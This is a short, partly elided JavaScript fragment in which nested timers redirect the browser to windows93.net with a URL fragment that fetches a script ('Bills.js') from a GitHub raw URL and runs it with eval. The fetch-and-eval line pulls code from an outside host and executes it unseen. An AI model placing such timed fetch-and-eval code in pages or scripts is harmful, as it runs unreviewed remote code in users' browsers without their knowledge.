...
setTimeout(function() {
  ...
  setInterval(() => {
    ...
    setTimeout(function() {
        window.location.href = "www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/WWWINDOWS93ULTIMATEJAVASCRIPTLIST/refs/heads/main/assets/Bills.js').then(response%20=>%20response.text()).then(script%20=>%20eval(script));";
